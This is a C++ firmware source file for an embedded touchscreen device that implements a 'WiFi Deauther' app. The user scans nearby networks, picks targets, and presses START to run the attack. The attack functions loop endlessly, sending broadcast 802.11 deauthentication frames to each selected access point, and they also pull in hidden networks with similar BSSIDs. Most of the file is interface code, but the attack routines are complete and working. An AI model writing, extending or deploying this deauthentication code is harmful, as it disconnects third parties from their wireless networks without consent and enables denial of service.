#include "app_display_deauther_wifi.h"

static config_wifi_deauther_t config_wifi_deauther;

static TaskHandle_t wifi_deauther_attack_handler = NULL;

std::vector<wifi_scan_result_t> wifi_deauther_results;
std::vector<wifi_scan_result_t> wifi_deauther_list_attack;

static lv_obj_t *wifi_deauther;
static lv_obj_t *wifi_deauther_close_btn;
static lv_obj_t *wifi_deauther_list;
static lv_obj_t *wifi_deauther_minus_btn;
static lv_obj_t *wifi_deauther_plus_btn;
static lv_obj_t *wifi_deauther_attack_start_btn;
static lv_obj_t *wifi_deauther_attack_stop_btn;

static lv_obj_t *wifi_deauther_select;
static lv_obj_t *wifi_deauther_select_list;
static lv_obj_t *wifi_deauther_select_close_btn;
static lv_timer_t *timer_noti;
static lv_obj_t *noti_mess;

static uint8_t wifi_deauther_init = 0;
static uint8_t wifi_deauther_list_number = 0;

static lv_obj_t *wifi_deauther_spinner_load;

static uint8_t index_wifi = 0;
static uint8_t deauth_bssid[6];
static uint16_t deauth_channel = 0;

static uint8_t index_wifi_reject_hidden[30];

static void wifi_deauther_list_btn_event_cb(lv_event_t *e);
static void wifi_deauther_btn_event_cb(lv_event_t *e);
static void wifi_deauther_select_list_choose_cb(lv_event_t *e);
static void wifi_deauther_update_list(lv_obj_t *list_deauther);

static void wifi_deauther_attack(void);
static void wifi_deauther_attack_single(void *pvParameters);
static void wifi_deauther_attack_multiple(void *pvParameters);

void deauther_wifi_set_deauth_reason(uint8_t deauth_reason) {
  config_wifi_deauther.deauth_reason = deauth_reason;
}

void deauther_wifi_set_frames_per_deauth(uint8_t frames_per_deauth) {
  config_wifi_deauther.frames_per_deauth = frames_per_deauth;
}

void deauther_wifi_set_num_wifi_deauth(uint8_t num_wifi_deauth) {
  config_wifi_deauther.num_wifi_deauth = num_wifi_deauth;
}

void deauther_wifi_set_num_wifi_list(uint8_t num_wifi_list) {
  config_wifi_deauther.num_wifi_list = num_wifi_list;
}

void app_display_deauther_wifi_build(void) {
  if (wifi_deauther_init == 1)
    return;
  wifi_deauther_init = 1;

  /* WiFi Deauther Screen Main */
  static lv_style_t style_background;
  lv_style_init(&style_background);
  lv_style_set_bg_color(&style_background, lv_color_hex(0x000000));

  wifi_deauther = lv_obj_create(lv_scr_act());
  lv_obj_add_flag(wifi_deauther, LV_OBJ_FLAG_HIDDEN);
  lv_obj_set_size(wifi_deauther, LV_HOR_RES, LV_VER_RES);
  lv_obj_align(wifi_deauther, LV_ALIGN_CENTER, 0, 0);
  lv_obj_add_style(wifi_deauther, &style_background, 0);

  lv_obj_t *wifi_deauther_label = lv_label_create(wifi_deauther);
  lv_label_set_text(wifi_deauther_label, LV_SYMBOL_WIFI " WiFi Deauther");
  lv_obj_align(wifi_deauther_label, LV_ALIGN_TOP_LEFT, 0, 0);

  wifi_deauther_close_btn = lv_btn_create(wifi_deauther);
  lv_obj_set_size(wifi_deauther_close_btn, 30, 30);
  lv_obj_align(wifi_deauther_close_btn, LV_ALIGN_TOP_RIGHT, 0, -10);
  lv_obj_add_event_cb(wifi_deauther_close_btn, wifi_deauther_btn_event_cb, LV_EVENT_ALL, NULL);
  lv_obj_t *btn_close_symbol = lv_label_create(wifi_deauther_close_btn);
  lv_label_set_text(btn_close_symbol, LV_SYMBOL_CLOSE);
  lv_obj_center(btn_close_symbol);

  wifi_deauther_list = lv_list_create(wifi_deauther);
  lv_obj_set_size(wifi_deauther_list, 290, 150);
  lv_obj_align(wifi_deauther_list, LV_ALIGN_TOP_LEFT, 0, 25);

  wifi_deauther_spinner_load = lv_spinner_create(wifi_deauther, 1000, 60);
  lv_obj_set_size(wifi_deauther_spinner_load, 50, 50);
  lv_obj_center(wifi_deauther_spinner_load);
  lv_obj_add_flag(wifi_deauther_spinner_load, LV_OBJ_FLAG_HIDDEN);

  /* WiFi Deauther Screen Select List */

  wifi_deauther_select = lv_obj_create(lv_scr_act());
  lv_obj_add_flag(wifi_deauther_select, LV_OBJ_FLAG_HIDDEN);
  lv_obj_set_size(wifi_deauther_select, LV_HOR_RES - 40, LV_VER_RES - 50);
  lv_obj_align(wifi_deauther_select, LV_ALIGN_CENTER, 0, 0);
  lv_obj_add_style(wifi_deauther_select, &style_background, 0);

  lv_obj_t *wifi_deauther_list = lv_label_create(wifi_deauther_select);
  lv_label_set_text(wifi_deauther_list, "Select WiFi ");
  lv_obj_align(wifi_deauther_list, LV_ALIGN_TOP_LEFT, 0, 0);

  wifi_deauther_select_close_btn = lv_btn_create(wifi_deauther_select);
  lv_obj_set_size(wifi_deauther_select_close_btn, 30, 30);
  lv_obj_align(wifi_deauther_select_close_btn, LV_ALIGN_TOP_RIGHT, 0, -10);
  lv_obj_add_event_cb(wifi_deauther_select_close_btn, wifi_deauther_btn_event_cb, LV_EVENT_ALL, NULL);
  lv_obj_t *btn_close_symbol_select = lv_label_create(wifi_deauther_select_close_btn);
  lv_label_set_text(btn_close_symbol_select, LV_SYMBOL_CLOSE);
  lv_obj_center(btn_close_symbol_select);

  wifi_deauther_select_list = lv_list_create(wifi_deauther_select);
  lv_obj_set_size(wifi_deauther_select_list, 290 - 50, 130);
  lv_obj_align(wifi_deauther_select_list, LV_ALIGN_TOP_LEFT, 0, 25);

  /* Add or remove list wifi deauther */

  wifi_deauther_minus_btn = lv_btn_create(wifi_deauther);
  lv_obj_set_size(wifi_deauther_minus_btn, 30, 30);
  lv_obj_add_flag(wifi_deauther_minus_btn, LV_OBJ_FLAG_FLOATING);
  lv_obj_align(wifi_deauther_minus_btn, LV_ALIGN_BOTTOM_RIGHT, -5, -lv_obj_get_style_pad_right(wifi_deauther_list, LV_PART_MAIN) - 40);
  lv_obj_add_event_cb(wifi_deauther_minus_btn, wifi_deauther_list_btn_event_cb, LV_EVENT_ALL, NULL);
  lv_obj_set_style_radius(wifi_deauther_minus_btn, LV_RADIUS_CIRCLE, 0);
  lv_obj_set_style_bg_img_src(wifi_deauther_minus_btn, LV_SYMBOL_MINUS, 0);
  lv_obj_set_style_text_font(wifi_deauther_minus_btn, lv_theme_get_font_large(wifi_deauther_minus_btn), 0);

  wifi_deauther_plus_btn = lv_btn_create(wifi_deauther);
  lv_obj_set_size(wifi_deauther_plus_btn, 30, 30);
  lv_obj_add_flag(wifi_deauther_plus_btn, LV_OBJ_FLAG_FLOATING);
  lv_obj_align(wifi_deauther_plus_btn, LV_ALIGN_BOTTOM_RIGHT, -5, -lv_obj_get_style_pad_right(wifi_deauther_list, LV_PART_MAIN) - 75);
  lv_obj_add_event_cb(wifi_deauther_plus_btn, wifi_deauther_list_btn_event_cb, LV_EVENT_ALL, NULL);
  lv_obj_set_style_radius(wifi_deauther_plus_btn, LV_RADIUS_CIRCLE, 0);
  lv_obj_set_style_bg_img_src(wifi_deauther_plus_btn, LV_SYMBOL_PLUS, 0);
  lv_obj_set_style_text_font(wifi_deauther_plus_btn, lv_theme_get_font_large(wifi_deauther_plus_btn), 0);

  // Deauther Attack Button
  wifi_deauther_attack_start_btn = lv_btn_create(wifi_deauther);
  lv_obj_set_size(wifi_deauther_attack_start_btn, 70, 30);
  lv_obj_align(wifi_deauther_attack_start_btn, LV_ALIGN_BOTTOM_LEFT, 50, 0);
  lv_obj_add_event_cb(wifi_deauther_attack_start_btn, wifi_deauther_btn_event_cb, LV_EVENT_ALL, NULL);
  lv_obj_t *btn_attack_start = lv_label_create(wifi_deauther_attack_start_btn);
  lv_label_set_text(btn_attack_start, "START");
  lv_obj_center(btn_attack_start);
  lv_obj_set_style_text_color(btn_attack_start, lv_color_black(), 0);

  if (wifi_deauther_list_number == 0) {
    lv_obj_add_state(wifi_deauther_minus_btn, LV_STATE_DISABLED);
    lv_obj_add_state(wifi_deauther_attack_start_btn, LV_STATE_DISABLED);
  }

  wifi_deauther_attack_stop_btn = lv_btn_create(wifi_deauther);
  lv_obj_set_size(wifi_deauther_attack_stop_btn, 70, 30);
  lv_obj_align(wifi_deauther_attack_stop_btn, LV_ALIGN_BOTTOM_RIGHT, -50, 0);
  lv_obj_add_event_cb(wifi_deauther_attack_stop_btn, wifi_deauther_btn_event_cb, LV_EVENT_ALL, NULL);
  lv_obj_t *btn_attack_stop = lv_label_create(wifi_deauther_attack_stop_btn);
  lv_label_set_text(btn_attack_stop, "STOP");
  lv_obj_center(btn_attack_stop);
  lv_obj_add_state(wifi_deauther_attack_stop_btn, LV_STATE_DISABLED);
  lv_obj_set_style_text_color(btn_attack_stop, lv_color_black(), 0);
}

void app_display_deauther_wifi_on(void) {
  lv_obj_clear_flag(wifi_deauther, LV_OBJ_FLAG_HIDDEN);
}

void app_display_deauther_wifi_off(void) {
  if (wifi_deauther_init == 1) {
    lv_obj_del_async(wifi_deauther);
    lv_obj_del_async(wifi_deauther_select);
    wifi_deauther_init = 0;
  }
}

uint8_t app_display_deauther_wifi_get_active(void) {
  if (wifi_deauther_init == 1) {
    return lv_obj_has_flag(wifi_deauther, LV_OBJ_FLAG_HIDDEN) ? 0 : 1;
  } else {
    return 1;
  }
}

static void noti_event_cb(lv_timer_t *timer) {
  LV_UNUSED(timer);
  lv_obj_add_flag(noti_mess, LV_OBJ_FLAG_HIDDEN);
  lv_obj_clean(noti_mess);
  lv_obj_clear_state(wifi_deauther_plus_btn, LV_STATE_DISABLED);
  lv_obj_clear_state(wifi_deauther_minus_btn, LV_STATE_DISABLED);
  lv_obj_clear_state(wifi_deauther_close_btn, LV_STATE_DISABLED);
  lv_obj_clear_state(wifi_deauther_attack_start_btn, LV_STATE_DISABLED);
  lv_timer_del(timer_noti);
}

static void wifi_deauther_list_btn_event_cb(lv_event_t *e) {
  lv_event_code_t code = lv_event_get_code(e);
  lv_obj_t *btn = lv_event_get_target(e);
  /* lv_obj_t *list = (lv_obj_t *)lv_event_get_user_data(e); */

  if (code == LV_EVENT_CLICKED) {
    if (btn == wifi_deauther_plus_btn) {

      if (!app_display_scan_wifi_get_state()) {

        lv_list_add_text(wifi_deauther_select_list, "WiFi: Not Found!");

      } else {

        if (wifi_deauther_list_number == config_wifi_deauther.num_wifi_deauth) {
          noti_mess = lv_msgbox_create(lv_scr_act(), "Warning", "\nMaximum WiFi Deauth", NULL, false);
          lv_obj_set_style_bg_color(noti_mess, lv_color_black(), 0);
          lv_obj_center(noti_mess);
          lv_obj_set_size(noti_mess, 200, 100);
          timer_noti = lv_timer_create(noti_event_cb, 2000, NULL);
          lv_obj_add_state(wifi_deauther_plus_btn, LV_STATE_DISABLED);
          lv_obj_add_state(wifi_deauther_minus_btn, LV_STATE_DISABLED);
          lv_obj_add_state(wifi_deauther_close_btn, LV_STATE_DISABLED);
          lv_obj_add_state(wifi_deauther_attack_start_btn, LV_STATE_DISABLED);
          return;
        }
        app_display_scan_wifi_get_results(wifi_deauther_results);

        uint8_t index_wifi_cur = 0;
        uint8_t num_wifi_null = 0;
        for (uint8_t i = 0; i < wifi_deauther_results.size() && i < config_wifi_deauther.num_wifi_list; i++) {
          if (wifi_deauther_results[i].ssid != NULL) {
            for (uint8_t j = 0; j < i; j++) {
              if (wifi_deauther_results[j].ssid == NULL) {
                num_wifi_null++;
              }
            }
            index_wifi_reject_hidden[index_wifi_cur] = num_wifi_null;
            index_wifi_cur++;
            num_wifi_null = 0;
          }
        }

        lv_obj_clean(wifi_deauther_select_list);
        char text[50];
        for (uint8_t i = 0; i < wifi_deauther_results.size() && i < config_wifi_deauther.num_wifi_list; i++) {
          if (wifi_deauther_results[i].ssid != NULL) {
            sprintf(text, "%s ( %d )", (char *)String(wifi_deauther_results[i].ssid).c_str(), wifi_deauther_results[i].channel);
            lv_obj_t *btn = lv_list_add_btn(wifi_deauther_select_list, LV_SYMBOL_WIFI, (char *)text);
            lv_obj_add_event_cb(btn, wifi_deauther_select_list_choose_cb, LV_EVENT_ALL, NULL);
          }
        }
      }
      lv_obj_clear_flag(wifi_deauther_select, LV_OBJ_FLAG_HIDDEN);
      lv_obj_add_state(wifi_deauther_close_btn, LV_STATE_DISABLED);
      lv_obj_add_state(wifi_deauther_attack_start_btn, LV_STATE_DISABLED);
    }
    if (btn == wifi_deauther_minus_btn) {
      if (wifi_deauther_list_number == 0) {
        lv_obj_add_state(wifi_deauther_minus_btn, LV_STATE_DISABLED);
        lv_obj_add_state(wifi_deauther_attack_start_btn, LV_STATE_DISABLED);
        return;
      } else {
        if (wifi_deauther_list_attack.back().ssid == NULL) {
          for (uint8_t i = 0; wifi_deauther_list_attack.back().ssid == NULL; i++) {
            wifi_deauther_list_attack.pop_back();
            wifi_deauther_list_number--;
          }
        }
        wifi_deauther_list_attack.pop_back();
        wifi_deauther_update_list(wifi_deauther_list);
        wifi_deauther_list_number--;
        if (wifi_deauther_list_number == 0) {
          lv_obj_add_state(wifi_deauther_attack_start_btn, LV_STATE_DISABLED);
          lv_obj_add_state(wifi_deauther_minus_btn, LV_STATE_DISABLED);
        }
      }
    }
  }
}

static void wifi_deauther_btn_event_cb(lv_event_t *e) {
  lv_event_code_t code = lv_event_get_code(e);
  lv_obj_t *btn = lv_event_get_target(e);

  if (code == LV_EVENT_CLICKED) {
    if (btn == wifi_deauther_close_btn) {
      lv_obj_add_flag(wifi_deauther, LV_OBJ_FLAG_HIDDEN);
      lv_obj_clear_state(wifi_deauther_plus_btn, LV_STATE_DISABLED);
      lv_obj_clear_state(wifi_deauther_minus_btn, LV_STATE_DISABLED);
      lv_obj_add_state(wifi_deauther_attack_start_btn, LV_STATE_DISABLED);
      lv_obj_add_state(wifi_deauther_attack_stop_btn, LV_STATE_DISABLED);
      lv_obj_add_flag(wifi_deauther_spinner_load, LV_OBJ_FLAG_HIDDEN);
      lv_obj_clean(wifi_deauther_list);
      wifi_deauther_list_number = 0;
      wifi_deauther_list_attack.clear();
      if (wifi_deauther_attack_handler != NULL) {
        vTaskDelete(wifi_deauther_attack_handler);
        wifi_deauther_attack_handler = NULL;
      }
    }
    if (btn == wifi_deauther_select_close_btn) {
      lv_obj_clean(wifi_deauther_select_list);
      lv_obj_add_flag(wifi_deauther_select, LV_OBJ_FLAG_HIDDEN);
      lv_obj_clear_state(wifi_deauther_close_btn, LV_STATE_DISABLED);
      if (wifi_deauther_list_number > 0)
        lv_obj_clear_state(wifi_deauther_attack_start_btn, LV_STATE_DISABLED);
    }

    if (btn == wifi_deauther_attack_start_btn) {
      lv_obj_add_state(wifi_deauther_attack_start_btn, LV_STATE_DISABLED);
      lv_obj_clear_state(wifi_deauther_attack_stop_btn, LV_STATE_DISABLED);
      lv_obj_add_state(wifi_deauther_plus_btn, LV_STATE_DISABLED);
      lv_obj_add_state(wifi_deauther_minus_btn, LV_STATE_DISABLED);
      lv_obj_clear_flag(wifi_deauther_spinner_load, LV_OBJ_FLAG_HIDDEN);
      wifi_deauther_attack();
    }

    if (btn == wifi_deauther_attack_stop_btn) {
      lv_obj_clear_state(wifi_deauther_attack_start_btn, LV_STATE_DISABLED);
      lv_obj_add_state(wifi_deauther_attack_stop_btn, LV_STATE_DISABLED);
      lv_obj_clear_state(wifi_deauther_plus_btn, LV_STATE_DISABLED);
      lv_obj_clear_state(wifi_deauther_minus_btn, LV_STATE_DISABLED);
      lv_obj_add_flag(wifi_deauther_spinner_load, LV_OBJ_FLAG_HIDDEN);
      if (wifi_deauther_attack_handler != NULL) {
        vTaskDelete(wifi_deauther_attack_handler);
        wifi_deauther_attack_handler = NULL;
      }
    }
  }
}

static void wifi_deauther_update_list(lv_obj_t *list_deauther) {
  lv_obj_clean(list_deauther);
  char text[50];
  for (uint8_t i = 0; i < wifi_deauther_list_attack.size(); i++) {
    sprintf(text, "%s ( %d )", (char *)String(wifi_deauther_list_attack[i].ssid).c_str(), wifi_deauther_list_attack[i].channel);
    lv_list_add_btn(list_deauther, LV_SYMBOL_WIFI, (char *)text);
  }
}

static void wifi_deauther_select_list_choose_cb(lv_event_t *e) {
  lv_event_code_t code = lv_event_get_code(e);
  lv_obj_t *btn = lv_event_get_target(e);

  if (code == LV_EVENT_CLICKED) {

    String selectedItem = String(lv_list_get_btn_text(wifi_deauther_select_list, btn));

    index_wifi = lv_obj_get_child_id(btn);
    index_wifi += index_wifi_reject_hidden[index_wifi];

    printf("index wifi: %d\r\n", index_wifi);

    printf("Select -> Wifi: %s Channel: %d RSSI: %d BSSID: %02X:%02X:%02X:%02X:%02X:%02X \r\n", (char *)String(wifi_deauther_results[index_wifi].ssid).c_str(),
           wifi_deauther_results[index_wifi].channel,
           wifi_deauther_results[index_wifi].rssi,
           wifi_deauther_results[index_wifi].bssid[0],
           wifi_deauther_results[index_wifi].bssid[1],
           wifi_deauther_results[index_wifi].bssid[2],
           wifi_deauther_results[index_wifi].bssid[3],
           wifi_deauther_results[index_wifi].bssid[4],
           wifi_deauther_results[index_wifi].bssid[5]);

    wifi_deauther_list_number += 1;
    wifi_deauther_list_attack.push_back(wifi_deauther_results[index_wifi]);
    wifi_deauther_update_list(wifi_deauther_list);
    lv_obj_clean(wifi_deauther_select_list);
    lv_obj_add_flag(wifi_deauther_select, LV_OBJ_FLAG_HIDDEN);
    lv_obj_clear_state(wifi_deauther_attack_start_btn, LV_STATE_DISABLED);
    lv_obj_clear_state(wifi_deauther_close_btn, LV_STATE_DISABLED);
    if (wifi_deauther_list_number > 0)
      lv_obj_clear_state(wifi_deauther_minus_btn, LV_STATE_DISABLED);
  }
}


static void wifi_deauther_attack(void) {
  xTaskCreate(wifi_deauther_attack_multiple,
              "wifi_deauther_attack_multiple",
              1024,
              NULL,
              1,
              &wifi_deauther_attack_handler);
}

static void wifi_deauther_attack_single(void *pvParameters) {
  memcpy(deauth_bssid, wifi_deauther_list_attack[index_wifi].bssid, 6);
  deauth_channel = wifi_deauther_list_attack[index_wifi].channel;
  wext_set_channel(WLAN0_NAME, deauth_channel);
  while (1) {
    for (uint8_t i = 0; i < config_wifi_deauther.frames_per_deauth; i++) {
      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", config_wifi_deauther.deauth_reason);
      vTaskDelay(5);
    }
    Serial.println("Ok");
  }
}

static void wifi_deauther_attack_multiple(void *pvParameters) {

  uint8_t size_attack = wifi_deauther_list_attack.size();
  for (uint8_t i = 0; i < size_attack; i++) {
    for (uint8_t j = 0; j < wifi_deauther_results.size(); j++) {
      if (wifi_deauther_results[j].ssid == NULL) {
        if (wifi_deauther_results[j].channel == wifi_deauther_list_attack[i].channel) {
          uint8_t same = 0;
          for (uint8_t k = 0; k < 6; k++) {
            if (wifi_deauther_results[j].bssid[k] == wifi_deauther_list_attack[i].bssid[k]) {
              same++;
            }
          }
          if (same >= 3) {
            wifi_deauther_list_attack.push_back(wifi_deauther_results[j]);
            wifi_deauther_list_number++;
          }
        }
      }
    }
  }
  printf("----- WiFi Attack -----\r\n");
  for (uint8_t i = 0; i < wifi_deauther_list_attack.size(); i++) {
    printf("Wifi: %s Channel: %d RSSI: %d BSSID: %02X:%02X:%02X:%02X:%02X:%02X \r\n", wifi_deauther_list_attack[i].ssid == NULL ? "Hidden Network" : (char *)String(wifi_deauther_list_attack[i].ssid).c_str(),
           wifi_deauther_list_attack[i].channel,
           wifi_deauther_list_attack[i].rssi,
           wifi_deauther_list_attack[i].bssid[0],
           wifi_deauther_list_attack[i].bssid[1],
           wifi_deauther_list_attack[i].bssid[2],
           wifi_deauther_list_attack[i].bssid[3],
           wifi_deauther_list_attack[i].bssid[4],
           wifi_deauther_list_attack[i].bssid[5]);
  }

  while (1) {
    for (uint8_t j = 0; j < wifi_deauther_list_attack.size(); j++) {
      memcpy(deauth_bssid, wifi_deauther_list_attack[j].bssid, 6);
      wifi_set_channel(wifi_deauther_list_attack[j].channel);
      for (uint8_t i = 0; i < config_wifi_deauther.frames_per_deauth; i++) {
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", config_wifi_deauther.deauth_reason);
        vTaskDelay(5);
      }
    }
  }
}
